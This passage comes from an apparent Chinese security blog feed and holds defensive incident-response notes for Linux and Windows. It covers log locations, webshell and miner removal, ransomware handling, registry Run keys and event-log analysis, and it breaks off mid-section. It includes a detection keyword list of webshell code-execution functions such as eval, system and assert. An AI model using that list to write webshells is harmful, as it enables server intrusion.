class="line">/var/log/btmp</span><br><span class="line"></span><br><span class="line"># 登录成功记录</span><br><span class="line">/var/log/wtmp</span><br><span class="line"></span><br><span class="line"># 最后一次登录</span><br><span class="line">/var/log/lastlog</span><br><span class="line"></span><br><span class="line"># 历史命令</span><br><span class="line">history</span><br><span class="line"></span><br><span class="line"># 文件内容中的恶意函数</span><br><span class="line">PHP：eval(、system(、assert(</span><br><span class="line">JSP：getRunTime(、 FileOutputStream(</span><br><span class="line">ASP：eval(、execute(、 ExecuteGlobal（</span><br><span class="line"></span><br><span class="line"># 保存历史命令</span><br><span class="line">cat .bash_history &gt;&gt;history.txt</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215130902211.png" data-caption="image-20230215130902211"><img src="/../images/emergency/linux/image-20230215130902211.png" alt="image-20230215130902211"></a></p><h3 id="13、webshell-查杀"><a href="#13、webshell-查杀" class="headerlink" title="13、webshell 查杀"></a>13、webshell 查杀</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 河马 https://www.shellpub.com，扫描完成之后结果会保存为result.csv文件，使用记事本或者excel打开查看</span><br><span class="line">./hm scan 你的web目录</span><br><span class="line">./hm deepscan 你的web目录（扫描时开启深度解码 ）</span><br></pre></td></tr></table></figure></div><h3 id="14、内存马查杀"><a href="#14、内存马查杀" class="headerlink" title="14、内存马查杀"></a>14、内存马查杀</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 河马内存马专杀，自动扫描java进程，自动模式下仅支持扫描 tomcat/weblogic/jboss 应用进程</span><br><span class="line">sudo ./hmj javascan</span><br><span class="line"></span><br><span class="line"># 指定进程扫描模式，程序仅扫描 -p 指定的进程</span><br><span class="line">sudo ./hmj javascan -p 3361</span><br><span class="line"></span><br><span class="line"># 也可以一次指定多个进程 id 进行扫描</span><br><span class="line">sudo ./hmj javascan -p 3361,3356</span><br><span class="line"></span><br><span class="line"># 默认情况下在当前执行目录下生成 result.csv 和 data.db 文件，未联网情况下还会生成 result.zip 文件</span><br><span class="line">- result.csv: 恶意内容的列表，包括恶意类型和路径</span><br><span class="line">- data.db: 检测结果的详细信息，sqlite 文件</span><br><span class="line">- result.zip: 检测到的恶意内容</span><br><span class="line">- output 指定输出扫描结果的目录</span><br></pre></td></tr></table></figure></div><h3 id="15、清除可疑进程与文件"><a href="#15、清除可疑进程与文件" class="headerlink" title="15、清除可疑进程与文件"></a>15、清除可疑进程与文件</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 清除进程：</span><br><span class="line">ps -aux</span><br><span class="line">ps -elf | grep 66579   </span><br><span class="line">kill -9 66579</span><br><span class="line"></span><br><span class="line"># 清除文件：</span><br><span class="line">ps -aux</span><br><span class="line">ls -al /proc/67730/exe</span><br><span class="line">rm -f /home/c2test</span><br><span class="line"></span><br><span class="line"># 使用 ps 查看启动 时间并 杀掉危险进</span><br><span class="line">ps -p 7224(进程PID) -o lstart</span><br><span class="line">kill -9 7224(进程PID)</span><br></pre></td></tr></table></figure></div><h2 id="三、特定场景"><a href="#三、特定场景" class="headerlink" title="三、特定场景"></a>三、特定场景</h2><h3 id="挖矿事件"><a href="#挖矿事件" class="headerlink" title="挖矿事件"></a>挖矿事件</h3><p>通过模拟挖矿事件开展应急响应，首先我们知道通常挖矿一个明显特征就是资源占用，内存飙升。通过者一特征很容易判断是否为挖矿事件，当然具体案例得具体分析。</p><h4 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h4><p>1、查看占用情况。</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 查看cpu占用情况（动态）</span><br><span class="line">top -c -o %CPU</span><br><span class="line"></span><br><span class="line"># 查看CPU占用前十的进程</span><br><span class="line">ps -eo user,pid,ppid,%mem,%cpu,cmd --sort=-%cpu | head -n 10</span><br><span class="line"></span><br><span class="line"># 按CPU 使用率从高到底排序</span><br><span class="line">ps -ef --sort -pcpu</span><br><span class="line"></span><br><span class="line"># 按内存从高到低</span><br><span class="line">ps -ef --sort -pmem</span><br></pre></td></tr></table></figure></div><p>2、定位恶意程序</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 定位可疑进程的程序是什么</span><br><span class="line">ps -aux</span><br><span class="line">ps -ef | grep pid号</span><br><span class="line"></span><br><span class="line"># 定位可疑进程文件位置</span><br><span class="line">lsof -p PID</span><br><span class="line">ls -al /proc/9109/exe </span><br></pre></td></tr></table></figure></div><p>3、清除进程</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 杀掉进程 </span><br><span class="line">kill -9 66579</span><br><span class="line"></span><br><span class="line"># 查看是否存在子进程</span><br><span class="line">ps ajfx</span><br><span class="line">systemctl status</span><br><span class="line"></span><br><span class="line"># 杀掉进程组</span><br><span class="line">kill -9 -pid</span><br><span class="line"></span><br><span class="line"># 使用 ps 查看启动时间并杀掉危险进</span><br><span class="line">ps -p 7224(进程PID) -o lstart</span><br><span class="line">kill -9 7224(进程PID)</span><br></pre></td></tr></table></figure></div><p>4、病毒分析</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 微步</span><br><span class="line">https://s.threatbook.com/</span><br><span class="line"></span><br><span class="line"># PCHunter</span><br><span class="line">https://scan.anxinsec.com/</span><br><span class="line"></span><br><span class="line"># virustotal</span><br><span class="line">https://www.virustotal.com/gui/home/upload</span><br><span class="line"></span><br><span class="line"># 360</span><br><span class="line">https://ata.360.net/</span><br><span class="line"></span><br><span class="line"># 哈勃</span><br><span class="line">https://habo.qq.com/</span><br></pre></td></tr></table></figure></div><h3 id="勒索病毒"><a href="#勒索病毒" class="headerlink" title="勒索病毒"></a>勒索病毒</h3><p>对于专业的勒索病毒，想要通过解密恢复数据的几率比较渺茫，剩下的就是妥协与不妥协。</p><h4 id="基本流程-1"><a href="#基本流程-1" class="headerlink" title="基本流程"></a>基本流程</h4><p>一旦发现疑似中病毒，无论是否为勒索病毒首先还是得先隔离主机，物理隔离或者资源隔离均可以，把损害降到最低。有备份清除病毒后重新拉取就系，没有备份那就……</p><p>解密平台</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 360</span><br><span class="line">https://lesuobingdu.360.cn/</span><br></pre></td></tr></table></figure></div><h2 id="六、参考"><a href="#六、参考" class="headerlink" title="六、参考"></a>六、参考</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/wpsec/Emergency-response-notes/blob/main/Linux-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94.md</span><br><span class="line">https://blog.csdn.net/qq_44874645/article/details/118459837</span><br><span class="line">https://mp.weixin.qq.com/s/iQSEvvLtpW_39UoymliYPA</span><br><span class="line">https://mp.weixin.qq.com/s/eGaQDLVo9yn3fIPFN2bH6w</span><br><span class="line">https://mp.weixin.qq.com/s/x6XKzXsnaY6bg_kZn_O3oA</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> 应急响应系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows 应急响应：思路探索与案例实践</title>
      <link href="/2023/10/22/Windows%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%EF%BC%9A%E6%80%9D%E8%B7%AF%E6%8E%A2%E7%B4%A2%E4%B8%8E%E6%A1%88%E4%BE%8B%E5%AE%9E%E8%B7%B5/"/>
      <url>/2023/10/22/Windows%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%EF%BC%9A%E6%80%9D%E8%B7%AF%E6%8E%A2%E7%B4%A2%E4%B8%8E%E6%A1%88%E4%BE%8B%E5%AE%9E%E8%B7%B5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>应急响应（emergency response）广义上指在出现紧急情况或突发事件时，迅速采取行动以减少损失、保护人员安全和恢复正常运营的过程。相对于网络安全行业来说特指系统或网络遭遇非法入侵、病毒入侵、恶意攻击等非法的安全入侵后而启动的安全排查并恢复正常运行。本文基于Windwos 平台的安全应急响应，结合相关安全案例简单阐述 Windows 网络安全应急响应工作的开展。</p><h2 id="二、基础知识"><a href="#二、基础知识" class="headerlink" title="二、基础知识"></a>二、基础知识</h2><p>对于 Windows 系统的应急响应，应需了解相应的系统知识，一定知识的积累可以帮助应急人员在应急响应时快速作出判断，便于工作的开展，以下为部分的 Windwos 系统基础知识。</p><h3 id="2-1-系统日志"><a href="#2-1-系统日志" class="headerlink" title="2.1 系统日志"></a>2.1 系统日志</h3><p>在Windows 应急响应中，主要分析的日志日志类型有：<strong>系统日志、安全日志、应用程序日志</strong>，快捷键 <code>Win + R</code>  在运行框输入 <code>eventvwr.msc</code> 即可打开事件查看器，对应绝对路径为 <code>C:\Windows\System32\winevt\Logs</code> 下的 <code>System.evtx</code>、<code>Security.evtx</code>、<code>Application.evtx</code></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231024205652587.png" data-caption="image-20231024205652587"><img src="/../images/emergency/windows/image-20231024205652587.png" alt="image-20231024205652587"></a></p><blockquote><p>系统日志</p></blockquote><p>系统日志主要记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。默认位置：<code>%SystemRoot%\System32\Winevt\Logs\System.evtx</code></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231020145804377-169833198664826.png" data-caption="image-20231020145804377"><img src="/../images/emergency/windows/image-20231020145804377-169833198664826.png" alt="image-20231020145804377"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231020150309096.png" data-caption="image-20231020150309096"><img src="/../images/emergency/windows/image-20231020150309096.png" alt="image-20231020150309096"></a></p><blockquote><p>安全日志</p></blockquote><p>安全日志记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。 安全日志也是调查取证中最常用到的日志。 默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志 或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应。 默认位置：<code>%SystemRoot%\System32\Winevt\Logs\Security.evtx</code></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231020150447266-169833205416728.png" data-caption="image-20231020150447266"><img src="/../images/emergency/windows/image-20231020150447266-169833205416728.png" alt="image-20231020150447266"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231020150528616.png" data-caption="image-20231020150528616"><img src="/../images/emergency/windows/image-20231020150528616.png" alt="image-20231020150528616"></a></p><blockquote><p>应用程序日志</p></blockquote><p>包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件 例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监视哪些事件。 如果某个应用程序出现崩溃情况，那么我们可以从程序事件日志中找到相应的记录，也许会有助于你解决问题。 默认位置：<code>%SystemRoot%\System32\Winevt\Logs\Application.evtx</code></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231020150345859-169833211539730.png" data-caption="image-20231020150345859"><img src="/../images/emergency/windows/image-20231020150345859-169833211539730.png" alt="image-20231020150345859"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231020150412625.png" data-caption="image-20231020150412625"><img src="/../images/emergency/windows/image-20231020150412625.png" alt="image-20231020150412625"></a></p><blockquote><p>PowerShell日志</p></blockquote><p>用户在执行 PowerShell 命令或脚本时，无论是本地还是通过远程处理，Windows都会将事件写入以下三个日志文件。默认位置</p><p><code>C:\Windows\System32\winevt\Logs</code></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Windows PowerShell.evtx</span><br><span class="line">Microsoft-Windows-PowerShell/Operational.evtx</span><br><span class="line">Microsoft-Windows-PowerShell/Analytic.etl(该分析日志必须开启才能捕获事件)</span><br></pre></td></tr></table></figure></div><h3 id="2-2-进程"><a href="#2-2-进程" class="headerlink" title="2.2 进程"></a>2.2 进程</h3><p>Windows 进程是在 Windows 操作系统中运行的程序实例。每个进程都是一个独立的执行环境，拥有自己的内存空间和系统资源。进程之间相互隔离，这样可以确保一个进程的崩溃或错误不会影响其他进程的稳定性。在Windows中，每个进程都有一个唯一的标识符，称为进程ID（Process ID，PID），进程ID用于识别和管理进程。Windows 操作系统使用进程调度算法来决定哪些进程在给定时间运行，以及它们在处理器上分配的时间。底部任务栏右键点击任务管理器即可打开</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231024205833532.png" data-caption="image-20231024205833532"><img src="/../images/emergency/windows/image-20231024205833532.png" alt="image-20231024205833532"></a></p><p>亦可通过 <code>Win + R</code> 输入 <code>msinfo32</code> <strong>系统环境-》正在运行任务</strong> 查看更为详细的进程信息，包括进程路径、进程ID、文件创建日期以及启动时间等。</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231025093811569.png" data-caption="image-20231025093811569"><img src="/../images/emergency/windows/image-20231025093811569.png" alt="image-20231025093811569"></a></p><p>终端命令为：<code>netstat -ano</code></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231024210046739.png" data-caption="image-20231024210046739"><img src="/../images/emergency/windows/image-20231024210046739.png" alt="image-20231024210046739"></a></p><h3 id="2-3-计划任务"><a href="#2-3-计划任务" class="headerlink" title="2.3 计划任务"></a>2.3 计划任务</h3><p>Windows 计划任务是一种功能，用于在指定的时间或事件发生时自动执行特定的任务或程序。<code>Win + R</code> 输入<code>taskschd.msc</code></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231024210240754.png" data-caption="image-20231024210240754"><img src="/../images/emergency/windows/image-20231024210240754.png" alt="image-20231024210240754"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231020155248086.png" data-caption="image-20231020155248086"><img src="/../images/emergency/windows/image-20231020155248086.png" alt="image-20231020155248086"></a></p><h2 id="三、入侵排查思路"><a href="#三、入侵排查思路" class="headerlink" title="三、入侵排查思路"></a>三、入侵排查思路</h2><p>当应急人员在接到应急响应任务后，首先需要冷静分析，充分了解事件详情，理清具体应急事件的类型，因为不同的类型所对应的应急方案略有差异；询问现场人员具体事件的发生及研判过程，再者询问是否有安全设备，若有，可通过安全平台针对应急事件类型查看日志获取有用信息，若已捕获相关样本则请求提供开展分析。以下步骤主要为针对服务器主机端的入侵排查操作，顺序不一定按照以下来，根据现场环境和得到的信息进行灵活处理即可。常见攻击或安全事件手段如下：</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| 类型     | 手段                          |</span><br><span class="line">| -------- | ----------------------------- |</span><br><span class="line">| Web入侵  | 网页挂马、主页篡改、Webshell  |</span><br><span class="line">| 系统入侵 | 病毒木马、勒索软件、远控后门  |</span><br><span class="line">| 网络攻击 | DDOS 攻击、DNS 劫持、ARP 欺骗 |</span><br></pre></td></tr></table></figure></div><h3 id="3-1-检查系统账号安全"><a href="#3-1-检查系统账号安全" class="headerlink" title="3.1 检查系统账号安全"></a>3.1 检查系统账号安全</h3><p>1、排查是否有异常的系统用户</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lusrmgr.msc</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231024211318261.png" data-caption="image-20231024211318261"><img src="/../images/emergency/windows/image-20231024211318261.png" alt="image-20231024211318261"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231024211230840.png" data-caption="image-20231024211230840"><img src="/../images/emergency/windows/image-20231024211230840.png" alt="image-20231024211230840"></a></p><p>cmd 终端命令亦可进行查询</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231024211545519.png" data-caption="image-20231024211545519"><img src="/../images/emergency/windows/image-20231024211545519.png" alt="image-20231024211545519"></a></p><p>2、排查账号信息（按照实际情况查询），若发现存在可疑账号可直接询问系统方管理员，咨询其账号归属，以下命令查看处于Administrator 组的用户</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup Administrators</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231024212009667.png" data-caption="image-20231024212009667"><img src="/../images/emergency/windows/image-20231024212009667.png" alt="image-20231024212009667"></a></p><h3 id="3-2-检查可疑进程、端口"><a href="#3-2-检查可疑进程、端口" class="headerlink" title="3.2 检查可疑进程、端口"></a>3.2 检查可疑进程、端口</h3><p>1、进程，通过命令查看目前的网络连接，定位可疑的 <code>ESTABLISHED</code> ,若主机已断网，则可注意处于 <code>LISTENING</code>，该步骤主要是排查对外 IP 与本机的连接情况。对可疑的 IP 进行安全排查。 </p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231025092732078.png" data-caption="image-20231025092732078"><img src="/../images/emergency/windows/image-20231025092732078.png" alt="image-20231025092732078"></a></p><p>定位可疑路径应用,若通过 netstat -ano 发现可疑链接或进程，则可通过定位其 PID 进而定位可疑应用，下列通过定位上图 <code>ESTABLISHED</code> 具体是哪个应用，上图 PID 为 852，由下图可知已经建立连接的应用程序为 chrome.exe </p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist  | findstr &quot;PID&quot;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231025092957892.png" data-caption="image-20231025092957892"><img src="/../images/emergency/windows/image-20231025092957892.png" alt="image-20231025092957892"></a></p><p>2、当然这里在不知道 PID 的情况下，通过端口获取 PID 进而定位具体应用，最外层的是 PID 号，得知 3306 端口 PID 为 1072 , 443 端口 PID 号为 852</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231025093336126.png" data-caption="image-20231025093336126"><img src="/../images/emergency/windows/image-20231025093336126.png" alt="image-20231025093336126"></a></p><h3 id="3-3-检测可疑计划任务"><a href="#3-3-检测可疑计划任务" class="headerlink" title="3.3 检测可疑计划任务"></a>3.3 检测可疑计划任务</h3><p>1、Win + R 输入命令后查看是否存在可疑的计划任务，若存在则对其开展安全排查</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">taskschd.msc</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231025094824878.png" data-caption="image-20231025094824878"><img src="/../images/emergency/windows/image-20231025094824878.png" alt="image-20231025094824878"></a></p><p>2、通过检查计算机与网络上的其它计算机之间的会话或计划任务排查安全隐患,通过对显示的可疑任务进行审查</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- 旧系统使用 at</span><br><span class="line">at</span><br><span class="line"></span><br><span class="line">- 较新系统输入</span><br><span class="line">schtasks.exe</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231025094612546.png" data-caption="image-20231025094612546"><img src="/../images/emergency/windows/image-20231025094612546.png" alt="image-20231025094612546"></a></p><h3 id="3-4-检查可疑启动项"><a href="#3-4-检查可疑启动项" class="headerlink" title="3.4 检查可疑启动项"></a>3.4 检查可疑启动项</h3><p>通过查看是否存在命名异常的启动项目，若存在则取消勾选命名异常的启动项目，并找到相关文件路径保存样本后可作删除处理。</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msconfig</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231027094540269.png" data-caption="image-20231027094540269"><img src="/../images/emergency/windows/image-20231027094540269.png" alt="image-20231027094540269"></a></p><p>2、检查组策略，查看是否有可疑启动策略</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpedit.msc</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231025100017942.png" data-caption="image-20231025100017942"><img src="/../images/emergency/windows/image-20231025100017942.png" alt="image-20231025100017942"></a></p><p>3、检查注册表,Win + R 输入 regedit 打开注册表，逐一排查可疑启动</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</span><br></pre></td></tr></table></figure></div><p>1）用户设置的启动项是排查的重点，若右边出现可疑的启动项则可对其排查，该删除后不影响系统运行。</p><p>\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231025100525020.png" data-caption="image-20231025100525020"><img src="/../images/emergency/windows/image-20231025100525020.png" alt="image-20231025100525020"></a></p><p>2）系统设置的启动项，一般是第三方软件的驱动程序，谨慎删除，可能会对系统造成影响。</p><p>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231025140852741.png" data-caption="image-20231025140852741"><img src="/../images/emergency/windows/image-20231025140852741.png" alt="image-20231025140852741"></a></p><p>3）系统启动项，该键路径用于在系统启动时只运行一次的应用程序或命令。执行完毕后，该键路径下的条目会被自动删除</p><p>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231025141525824.png" data-caption="image-20231025141525824"><img src="/../images/emergency/windows/image-20231025141525824.png" alt="image-20231025141525824"></a></p><h3 id="3-5-可疑文件排查"><a href="#3-5-可疑文件排查" class="headerlink" title="3.5 可疑文件排查"></a>3.5 可疑文件排查</h3><p>一般手法的 web 端攻击获取 webshell 或进行后渗透时，大多数情况下会生成相关的落地文件，通常情况下我们对相应的时间段内的文件进行排除即可，若已经进行了后渗透隐藏了另说。</p><p>这边使用 everything 进行排除，下载地址：<a href="https://www.voidtools.com/zh-cn/downloads/%EF%BC%8C%E5%91%BD%E4%BB%A4%E5%A6%82%E4%B8%8B%EF%BC%8C%E6%90%9C%E7%B4%A2%E6%97%B6%E9%97%B4%E4%BB%8E2023%E5%B9%B410%E6%9C%8824%E6%97%A5-2023%E5%B9%B410%E6%9C%8825%E6%97%A5%E5%86%85%E6%96%B0%E5%BB%BA%E7%9A%84">https://www.voidtools.com/zh-cn/downloads/，命令如下，搜索时间从2023年10月24日-2023年10月25日内新建的</a> .exe、.bat、.vbs、.jsp、.jar、.dll 文件，命令根据实际情况调整</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dm:2023/10/24-2023/10/25 *.exe|*.bat|*.vbs|*.jsp</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231025173133344.png" data-caption="image-20231025173133344"><img src="/../images/emergency/windows/image-20231025173133344.png" alt="image-20231025173133344"></a></p><h3 id="3-6-日志分析"><a href="#3-6-日志分析" class="headerlink" title="3.6 日志分析"></a>3.6 日志分析</h3><p>日志分析，主要对服务器主机日志、web 日志、安全设备日志进行排除审计。</p><blockquote><p>服务器主机日志</p></blockquote><p>具体位置上述已有说明，这里不在阐述，这边使用 FullEventLogView 工具，下载地址：<a href="https://www.nirsoft.net/utils/full_event_log_view.html">https://www.nirsoft.net/utils/full_event_log_view.html</a> 以及 LogParser 工具，下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">https://www.microsoft.com/en-us/download/details.aspx?id=24659</a> 进行分析。</p><p>1）full_event_log_view ，使用该工具，只需要将 .evtx 日志放置在某一文件夹内，勾选相关功能即可可视化显示日志信息。</p><p>勾选 Option 中的 Show Event String In Columns 展示更多的事件信息。</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026100728024.png" data-caption="image-20231026100728024"><img src="/../images/emergency/windows/image-20231026100728024.png" alt="image-20231026100728024"></a></p><p>full_event_log_view 默认显示的时间为 7 天，若想要显示其它时间需要，需要在 Option 中的 Advanced Option 中另选择</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026101103645.png" data-caption="image-20231026101103645"><img src="/../images/emergency/windows/image-20231026101103645.png" alt="image-20231026101103645"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026101149371.png" data-caption="image-20231026101149371"><img src="/../images/emergency/windows/image-20231026101149371.png" alt="image-20231026101149371"></a></p><p>然后将需要分析的 .evtx 日志文件放在同一目录下如 System.evtx、Security.evtx、Application.evtx，等待加载完日志，即可可视化查看日志记录</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026101544532.png" data-caption="image-20231026101544532"><img src="/../images/emergency/windows/image-20231026101544532.png" alt="image-20231026101544532"></a></p><p>若想要定点分析，可在 Option 中的 Advance Option 设置查看特定的事件或过滤某关键字</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026101812556.png" data-caption="image-20231026101812556"><img src="/../images/emergency/windows/image-20231026101812556.png" alt="image-20231026101812556"></a></p><p>2）LogParser 